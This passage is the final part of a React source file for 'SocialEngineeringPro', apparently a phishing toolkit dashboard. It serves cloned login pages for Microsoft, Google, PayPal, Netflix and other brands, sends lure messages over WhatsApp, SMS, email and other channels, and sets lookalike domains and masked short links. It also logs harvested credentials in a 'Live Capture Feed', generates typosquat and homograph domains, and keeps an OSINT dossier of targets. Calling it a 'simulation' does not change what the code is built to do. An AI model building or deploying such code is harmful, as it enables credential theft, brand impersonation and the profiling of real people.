                                                                <button onClick={() => clonerDeployedUrl && navigator.clipboard.writeText(clonerDeployedUrl)} className="text-purple-400 hover:text-purple-300 font-bold uppercase text-[10px] px-2">Copy</button>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-7 gap-3">
                                                        {[
                                                            { id: 'whatsapp', icon: MessageSquare, color: '#25D366' },
                                                            { id: 'messenger', icon: Facebook, color: '#0084FF' },
                                                            { id: 'sms', icon: Smartphone, color: '#FFD700' },
                                                            { id: 'email', icon: Mail, color: '#EA4335' },
                                                            { id: 'telegram', icon: Send, color: '#0088cc' },
                                                            { id: 'twitter', icon: Globe, color: '#1DA1F2' },
                                                            { id: 'linkedin', icon: Users, color: '#0077b5' }
                                                        ].map((p) => (
                                                            <button
                                                                key={p.id}
                                                                onClick={() => {
                                                                    setCampaignPlatform(p.id);
                                                                    setCustomCampaignMessage('');
                                                                }}
                                                                className={`p-3 rounded-xl border flex flex-col items-center gap-2 transition-all ${campaignPlatform === p.id
                                                                    ? 'bg-purple-900/40 border-purple-500 text-white shadow-[0_0_15px_rgba(168,85,247,0.4)]'
                                                                    : 'bg-white/5 border-white/10 opacity-40 hover:opacity-100 hover:bg-white/10'}`}
                                                            >
                                                                <p.icon size={20} style={{ color: p.color }} />
                                                                <span className="text-[9px] font-black uppercase tracking-tighter">{p.id}</span>
                                                            </button>
                                                        ))}
                                                    </div>

                                                    <div className="bg-white/5 p-4 rounded-xl border border-white/5">
                                                        <label className="text-[10px] font-black uppercase text-white/30 block mb-2">Simulation Message</label>
                                                        <textarea
                                                            value={customCampaignMessage || getProfessionalPretext(campaignPlatform, clonerUrl)}
                                                            onChange={(e) => setCustomCampaignMessage(e.target.value)}
                                                            className="w-full bg-black/40 border border-white/10 rounded-lg p-3 text-[11px] text-white/80 h-24 focus:border-purple-500 transition-all resize-none font-sans"
                                                            placeholder="Edit your message here..."
                                                        />
                                                        <button onClick={() => handleSocialShare(campaignPlatform)} className="mt-4 w-full bg-blue-600 hover:bg-blue-500 text-white p-3 rounded-lg text-[10px] font-black uppercase tracking-widest flex items-center justify-center gap-2 shadow-lg shadow-blue-900/40">
                                                            <ExternalLink size={14} /> Send via {campaignPlatform.toUpperCase()}
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>

                                            <div className="bg-black/40 border border-white/10 rounded-2xl p-6">
                                                <h3 className="text-sm font-black uppercase text-white/40 mb-6 flex items-center gap-2">
                                                    <Fingerprint size={16} /> Intercept Telemetry
                                                </h3>
                                                <div className="space-y-4">
                                                    <div className="bg-white/5 p-4 rounded-xl border border-white/5">
                                                        <label className="text-[9px] font-black uppercase text-purple-400 block mb-3">Global C2 Configuration</label>
                                                        <div className="space-y-3">
                                                            <div>
                                                                <label className="text-[8px] text-white/20 uppercase mb-1 block">Custom Phishing Domain (Base URL)</label>
                                                                <input
                                                                    type="text"
                                                                    placeholder="e.g. microsoft-login-verify"
                                                                    value={stealthAlias}
                                                                    onChange={(e) => setStealthAlias(e.target.value)}
                                                                    className="w-full bg-black/40 border border-white/10 rounded-lg p-2 text-[10px] text-red-400 focus:border-red-500 outline-none mb-2"
                                                                />
                                                                <div className="flex items-center gap-2 mb-2">
                                                                    <input
                                                                        type="checkbox"
                                                                        checked={useAuthorityMask}
                                                                        onChange={(e) => setUseAuthorityMask(e.target.checked)}
                                                                        className="w-3 h-3 rounded bg-white/5 border-white/20"
                                                                    />
                                                                    <label className="text-[8px] text-white/40 uppercase font-black">Enable @ Authority Masking</label>
                                                                </div>
                                                                <p className="text-[8px] text-white/20 mt-1 italic">Short link will look like: is.gd/{stealthAlias || 'auto-generated-name'}</p>
                                                            </div>
                                                            <div>
                                                                <label className="text-[8px] text-white/20 uppercase mb-1 block">Custom Phishing Domain (Base URL)</label>
                                                                <input
                                                                    type="text"
                                                                    placeholder="e.g. https://micro-soft-login.com"
                                                                    value={customBaseUrl}
                                                                    onChange={(e) => setCustomBaseUrl(e.target.value)}
                                                                    className="w-full bg-black/40 border border-white/10 rounded-lg p-2 text-[10px] text-purple-400 focus:border-purple-500 outline-none"
                                                                />
                                                                <p className="text-[8px] text-white/20 mt-1 italic">Leave empty to use Vercel default.</p>
                                                            </div>
                                                            <div className="bg-blue-600/10 border border-blue-500/20 p-2 rounded-lg">
                                                                <p className="text-[8px] text-blue-400 font-bold uppercase mb-1 italic">Pro Tip (100% Reality):</p>
                                                                <p className="text-[7px] text-white/40 leading-tight">Rename your Vercel project to something like "microsoft-login" in settings to get a free https://microsoft-login.vercel.app domain.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </motion.div>
                                    )}
                                    <div className="space-y-4">
                                        <h3 className="text-xs font-black uppercase text-white/30 tracking-widest flex items-center gap-2">
                                            <Terminal size={14} className="text-blue-400" /> Live Capture Feed (Captures)
                                        </h3>
                                        <div className="bg-black/60 border border-white/10 rounded-2xl overflow-hidden">
                                            <table className="w-full text-left text-xs">
                                                <thead className="bg-white/5 border-b border-white/10">
                                                    <tr>
                                                        <th className="p-4 font-black uppercase text-white/20">Time</th>
                                                        <th className="p-4 font-black uppercase text-white/20">Target / Origin</th>
                                                        <th className="p-4 font-black uppercase text-white/20">Device / Payload</th>
                                                        <th className="p-4 font-black uppercase text-white/20">Captured Intel</th>
                                                        <th className="p-4 text-right pr-6">Action</th>
                                                    </tr>
                                                </thead>
                                                <tbody className="divide-y divide-white/5">
                                                    {harvestedData.map(h => (
                                                        <tr key={h.id} className="hover:bg-white/5 transition-colors group">
                                                            <td className="p-4 text-white/40">{h.time}</td>
                                                            <td className="p-4">
                                                                <div className="font-bold text-blue-400">{h.domain}</div>
                                                                <div className="text-[10px] text-white/20 font-mono italic">{h.location || 'IP Unknown'}</div>
                                                            </td>
                                                            <td className="p-4">
                                                                <div className="text-purple-400 font-black text-[10px] uppercase">{h.device}</div>
                                                                <div className="text-[9px] text-white/30 uppercase">{h.platform || 'General'}</div>
                                                            </td>
                                                            <td className="p-4 font-mono text-white/60 text-xs">{h.data}</td>
                                                            <td className="p-4 text-right pr-6">
                                                                <button onClick={() => copyToClipboard(h.data)} className="p-2 opacity-0 group-hover:opacity-100 hover:bg-white/10 rounded-lg text-white/40"><Copy size={14} /></button>
                                                            </td>
                                                        </tr>
                                                    ))}
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </motion.div>
                            )}

                            {/* --- 4. TYPOSQUAT PRO TOOLKIT V2 --- */}
                            {activeTab === 'typo' && (
                                <motion.div key="typo" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-8">
                                    <SectionHeader icon={Globe} title="TYPOSQUAT PRO V2.0" desc="Advanced domain strategy & homograph generation" />

                                    <div className="bg-white/5 border border-white/10 rounded-2xl p-8 backdrop-blur-xl max-w-2xl shadow-2xl">
                                        <div className="space-y-6">
                                            <div className="space-y-2">
                                                <label className="text-[10px] font-black uppercase text-white/30 tracking-[0.3em]">Base Operative Domain</label>
                                                <div className="flex gap-4">
                                                    <input
                                                        type="text"
                                                        value={typoDomain}
                                                        onChange={(e) => setTypoDomain(e.target.value)}
                                                        className="flex-1 bg-black/60 border border-white/10 rounded-xl p-4 text-white focus:border-purple-500 focus:outline-none transition-all font-mono"
                                                    />
                                                    <button
                                                        onClick={generateTyposV2}
                                                        className="px-8 bg-purple-600 hover:bg-purple-500 text-white rounded-xl font-black uppercase text-xs tracking-widest transition-all shadow-lg shadow-purple-900/40"
                                                    >
                                                        Scan
                                                    </button>
                                                </div>
                                            </div>

                                            {typoResults.length > 0 && (
                                                <div className="grid grid-cols-1 gap-3 pt-6 border-t border-white/5">
                                                    {typoResults.map((typo, i) => (
                                                        <div key={i} className="flex items-center justify-between p-4 bg-black/40 border border-white/5 rounded-2xl group hover:border-purple-500/40 transition-all">
                                                            <div className="flex items-center gap-4">
                                                                <div className={`w-2 h-2 rounded-full ${typo.risk === 'Extreme' ? 'bg-red-500 shadow-[0_0_10px_rgba(239,68,68,0.5)]' : typo.risk === 'High' ? 'bg-orange-500' : 'bg-blue-500'}`} title={`Risk: ${typo.risk}`} />
                                                                <div>
                                                                    <div className="text-sm font-bold text-white tracking-tight">{typo.domain}</div>
                                                                    <div className="text-[10px] text-white/20 uppercase font-black">{typo.type}</div>
                                                                </div>
                                                            </div>
                                                            <div className="flex gap-2">
                                                                <span className={`text-[9px] font-black uppercase px-2 py-0.5 rounded ${typo.risk === 'Extreme' ? 'bg-red-500/20 text-red-400' : 'bg-white/5 text-white/40'}`}>
                                                                    {typo.risk} Risk
                                                                </span>
                                                                <button onClick={() => copyToClipboard(typo.domain)} className="p-2 opacity-0 group-hover:opacity-100 hover:bg-white/10 rounded-lg text-purple-400"><Copy size={16} /></button>
                                                            </div>
                                                        </div>
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                    </div>

                                    {/* Strategy Cards */}
                                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                        {[
                                            { icon: Shield, title: 'BitSquatting', desc: 'Single bit flips in character codes. Hard to detect, high success for systemic bots.', color: 'text-blue-400' },
                                            { icon: Briefcase, title: 'ComboSquat', desc: 'Brand + High trust keywords (Login, Secure, Support). Best for user manipulation.', color: 'text-purple-400' },
                                            { icon: Fingerprint, title: 'Punycode', desc: 'Using IDN homographs (unicode chars that look identical). Bypasses visual audit.', color: 'text-red-400' }
                                        ].map((card, i) => (
                                            <div key={i} className="p-6 bg-white/5 border border-white/10 rounded-2xl hover:bg-white/10 transition-all group">
                                                <card.icon size={24} className={`${card.color} mb-4 group-hover:scale-110 transition-transform`} />
                                                <h4 className="text-sm font-black text-white uppercase mb-2 tracking-tight">{card.title}</h4>
                                                <p className="text-[11px] text-white/40 leading-relaxed font-sans">{card.desc}</p>
                                            </div>
                                        ))}
                                    </div>
                                </motion.div>
                            )}

                            {/* --- 5. TARGET DOSSIER (OSINT) --- */}
                            {activeTab === 'dossier' && (
                                <motion.div key="dossier" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="space-y-8">
                                    <SectionHeader icon={UserCheck} title="OPERATIVE TARGET DOSSIER" desc="Secure OSINT repository & historical profiles" />

                                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                                        {dossier.length === 0 && (
                                            <div className="col-span-full py-20 text-center border-2 border-dashed border-white/5 rounded-[40px] bg-white/20">
                                                <UserPlus size={64} className="mx-auto text-white/10 mb-6" />
                                                <p className="text-white/20 uppercase font-black tracking-[0.4em] text-sm">Clear Dossier: Add targets to begin</p>
                                            </div>
                                        )}
                                        {dossier.map(item => (
                                            <motion.div layout key={item.id} className="bg-gradient-to-br from-white/10 to-transparent border border-white/10 rounded-[32px] p-6 relative group hover:border-purple-500/40 transition-all flex flex-col justify-between overflow-hidden shadow-2xl">
                                                <div className="flex justify-between items-start mb-8">
                                                    <div className="w-16 h-16 rounded-3xl bg-gradient-to-br from-purple-600 to-blue-600 flex items-center justify-center text-white font-black text-2xl rotate-3 group-hover:rotate-0 transition-transform shadow-xl shadow-purple-900/40">
                                                        {item.name[0]}
                                                    </div>
                                                    <div className="flex gap-2">
                                                        <button onClick={() => setTargetInfo(item)} className="p-2.5 bg-white/5 hover:bg-white/10 rounded-xl text-blue-400 shadow-lg"><Eye size={18} /></button>
                                                        <button onClick={() => setDossier(dossier.filter(d => d.id !== item.id))} className="p-2.5 bg-white/5 hover:bg-white/10 rounded-xl text-red-500/60 shadow-lg"><Trash2 size={18} /></button>
                                                    </div>
                                                </div>
                                                <div>
                                                    <h3 className="text-xl font-black text-white leading-none mb-2">{item.name}</h3>
                                                    <p className="text-xs text-purple-400 font-black uppercase tracking-widest bg-purple-400/10 w-fit px-2 py-1 rounded mb-6">{item.role}</p>

                                                    <div className="space-y-3">
                                                        <div className="flex justify-between text-[10px] border-b border-white/5 pb-1">
                                                            <span className="text-white/20 font-black uppercase">Company</span>
                                                            <span className="text-white/70">{item.company}</span>
                                                        </div>
                                                        <div className="flex justify-between text-[10px] border-b border-white/5 pb-1">
                                                            <span className="text-white/20 font-black uppercase">Email</span>
                                                            <span className="text-white/70">{item.email}</span>
                                                        </div>
                                                        <div className="flex justify-between text-[10px]">
                                                            <span className="text-white/20 font-black uppercase">Location</span>
                                                            <span className="text-white/70">{item.location}</span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div className="mt-8 flex justify-between items-center text-[9px] text-white/20 font-black uppercase tracking-[0.2em]">
                                                    <div className="flex items-center gap-1.5"><div className="w-1.5 h-1.5 rounded-full bg-green-500" /> Profiling Active</div>
                                                    <span>{item.date}</span>
                                                </div>
                                            </motion.div>
                                        ))}
                                    </div>
                                </motion.div>
                            )}
                        </AnimatePresence>
                    </div>
                </main>
            </div>

            {/* Ultra Status Bar */}
            <footer className="fixed bottom-0 left-0 w-full p-2 bg-black border-t border-purple-500/10 flex justify-between items-center text-[9px] font-black uppercase tracking-[0.3em] z-30 overflow-hidden">
                <div className="flex items-center gap-6 text-white/30 ml-4">
                    <span className="flex items-center gap-2">
                        <div className="w-1.5 h-1.5 rounded-full bg-purple-500 animate-pulse shadow-[0_0_8px_rgba(168,85,247,0.8)]" />
                        NODAL LINK: STABLE
                    </span>
                    <span className="hidden lg:inline bg-white/5 px-2 py-0.5 rounded">CRYPT: QUANTUM-ECC</span>
                    <span className="hidden lg:inline">VECTOR: [{activeTab.toUpperCase()}]</span>
                </div>
                <div className="text-purple-500/80 mr-4 font-mono">
                    SHADOWHACK // SE-ULTRA v5.0 // INTEL_CORP_PROTO
                </div>
            </footer>

            {/* Global Overlay FX */}
            <div className="fixed inset-0 pointer-events-none z-50 mix-blend-overlay opacity-[0.03]" style={{ backgroundImage: 'url("https://grains.now.sh/images/grain.png")' }} />

            {/* QR BRIDGE MODAL */}
            <AnimatePresence>
                {showQRModal && (
                    <motion.div
                        initial={{ opacity: 0, scale: 0.9 }}
                        animate={{ opacity: 1, scale: 1 }}
                        exit={{ opacity: 0, scale: 0.9 }}
                        className="fixed inset-0 z-[200] bg-black/80 backdrop-blur-md flex items-center justify-center p-4"
                        onClick={() => setShowQRModal(false)}
                    >
                        <div className="bg-white text-black p-8 rounded-2xl shadow-2xl max-w-md w-full text-center relative" onClick={e => e.stopPropagation()}>
                            <button
                                onClick={() => setShowQRModal(false)}
                                className="absolute top-4 right-4 text-gray-400 hover:text-black"
                            >
                                <XCircle size={24} />
                            </button>

                            <h3 className="text-2xl font-black mb-2 uppercase tracking-tight flex items-center justify-center gap-2">
                                <Smartphone className="text-purple-600" /> Mobile Bridge
                            </h3>
                            <p className="text-gray-500 text-sm mb-6 font-mono border-b pb-4">
                                {qrData.title}
                            </p>

                            <div className="bg-gray-100 p-4 rounded-xl inline-block mb-6 border-2 border-dashed border-gray-300">
                                <img
                                    src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrData.url)}`}
                                    alt="Scan to Send"
                                    className="w-48 h-48 mix-blend-multiply"
                                />
                            </div>

                            <p className="text-xs text-gray-400 font-mono">
                                1. Open Camera App <br />
                                2. Scan QR Code <br />
                                3. Confirm in 'SMS/Messages' App
                            </p>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* PREVIEW MODAL */}
            <AnimatePresence>
                {showPreview && (
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[100] bg-black/90 backdrop-blur-xl flex items-center justify-center p-4 lg:p-20"
                    >
                        <div className="w-full h-full bg-white rounded-3xl overflow-hidden flex flex-col shadow-[0_0_100px_rgba(0,0,0,0.5)]">
                            <div className="bg-gray-100 p-4 flex justify-between items-center border-b border-gray-200">
                                <div className="flex items-center gap-4">
                                    <div className="flex gap-1.5">
                                        <div className="w-3 h-3 rounded-full bg-red-400" />
                                        <div className="w-3 h-3 rounded-full bg-yellow-400" />
                                        <div className="w-3 h-3 rounded-full bg-green-400" />
                                    </div>
                                    <div className="bg-white px-4 py-1 rounded-lg border border-gray-300 text-[10px] text-gray-500 font-mono flex items-center gap-2">
                                        <Shield size={10} className="text-green-500" /> {clonerUrl}
                                    </div>
                                </div>
                                <button
                                    onClick={() => setShowPreview(false)}
                                    className="p-2 hover:bg-gray-200 rounded-full text-gray-400 transition-colors"
                                >
                                    <XCircle size={24} />
                                </button>
                            </div>
                            <div className="flex-1 overflow-y-auto bg-[#f0f2f5] flex items-center justify-center p-8">
                                {(() => {
                                    const u = clonerUrl.toLowerCase();
                                    const h = { onHarvest: handleHarvest, onFinish: finalizeHarvest };
                                    if (u.includes('microsoft') || u.includes('outlook') || u.includes('office')) return CLONE_MOCKUPS.microsoft(h);
                                    if (u.includes('google') || u.includes('gmail')) return CLONE_MOCKUPS.google(h);
                                    if (u.includes('facebook') || u.includes('fb.')) return CLONE_MOCKUPS.facebook(h);
                                    if (u.includes('instagram')) return CLONE_MOCKUPS.instagram(h);
                                    if (u.includes('discord')) return CLONE_MOCKUPS.discord(h);
                                    if (u.includes('github')) return CLONE_MOCKUPS.github(h);
                                    if (u.includes('paypal')) return CLONE_MOCKUPS.paypal(h);
                                    if (u.includes('netflix')) return CLONE_MOCKUPS.netflix(h);
                                    if (u.includes('shahid')) return CLONE_MOCKUPS.shahid(h);
                                    if (u.includes('watchit')) return CLONE_MOCKUPS.watchit(h);
                                    if (u.includes('yango')) return CLONE_MOCKUPS.yangoplay(h);
                                    if (u.includes('spotify')) return CLONE_MOCKUPS.spotify(h);
                                    if (u.includes('anghami')) return CLONE_MOCKUPS.anghami(h);
                                    if (u.includes('deezer')) return CLONE_MOCKUPS.deezer(h);
                                    if (u.includes(' x.com') || u.includes('twitter')) return CLONE_MOCKUPS.x(h);
                                    if (u.includes('linkedin')) return CLONE_MOCKUPS.linkedin(h);
                                    return CLONE_MOCKUPS.generic(h, clonerUrl);
                                })()}
                            </div>
                            <div className="bg-white p-4 border-t border-gray-100 flex justify-center gap-6 text-[10px] text-gray-400">
                                <span>Terms of use</span>
                                <span>Privacy & cookies</span>
                                <span className="font-mono">© 2024 DEPLOYED_INSTANCE_v5</span>
                            </div>
                        </div>
                        <div className="absolute top-8 left-1/2 -translate-x-1/2 bg-yellow-500 text-black px-4 py-1 rounded-full text-[10px] font-black uppercase tracking-widest shadow-xl flex items-center gap-2">
                            <ShieldAlert size={12} /> Live Simulation Preview - Connection Intercepted
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
};



export default SocialEngineeringPro;
